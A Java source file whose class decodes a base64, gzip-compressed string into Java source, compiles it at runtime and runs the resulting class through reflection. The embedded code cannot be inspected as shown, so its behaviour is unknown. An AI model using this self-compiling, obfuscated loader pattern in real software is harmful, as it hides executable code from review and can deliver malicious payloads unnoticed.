import javax.tools.*;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.zip.*;

class D1 extends SimpleJavaFileObject
{
    public D1()
    {
        super(URI.create(""),Kind.SOURCE);
    }

    public static void main(String args[]) throws Exception
    {
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        compiler.getTask(null, null, null, null, null, Arrays.asList(new D1())).call();
        Class.forName("S").getDeclaredMethod("main", new Class[] { String[].class })
            .invoke(null, new Object[]{null});
    }

    public String getCharContent(boolean ignoreEncodingErrors)
    {
        try
        {
            String encoded = "H4sIAAAAAAAAAHVRXWsbMRD8KxdBijZ3VnKNKSSykoe2Ty1twRAKxhRVlpMNOt1x0iVyHP/3ruwLCaV90cfuzu7sDDZd28fiXj/odRJDRCdOJL4G/xsKsbe6oYxxOoRivg1RRzQF+lh0i6Xy9jG/F/XFh2WVVD2VY8FXDLEw+/yNNbHtOVRBdsNvR8mx5qHFVdFo9Hwee/S3i+Uv2M6N9t72hd5jxx+fb0K0jUAPYgj2k3XYYKQ4qxjIxzt0lmtxp8M3myIH6BbpuJ4qVb+/TqU6vyzLtFRa+H2Wuqxs+r7m7CeDspZrIpfUmUwz2kKmsoStEcZZTZzl2rXtiuduVTqtpyBxzY+MwPC56eKGwzselPKDc8/PRgR8shxmYXwAhLcCGJC7cY92iKKjlaPzL/hrdsYuX5AlK9RVwcowGkCkG91xO7linJWcExI4/6GxBwvi1sYvlrhMagJWxT8LbrQb7FgCDIRpnSNa/OPhbvsg7lv05ALPLYi73L216aBDtj1V+dzAlpToFvX0ZEPiHqmzrJperXjeOA/mqdpQl6xuBiApjLMLiaTvQUPT+kjmh1cEnp5P6pIGHOeb0DCO/Ssud7vdH+eapwPTAgAA";
            ByteArrayInputStream byteStream = new ByteArrayInputStream(Base64.getDecoder().decode(encoded));
            byte[] sJava = new byte[723];
            new GZIPInputStream(byteStream).read(sJava);
            return new String(sJava);
        }
        catch (Exception e)
        {
            e.printStackTrace();
            return null;
        }
    }
}
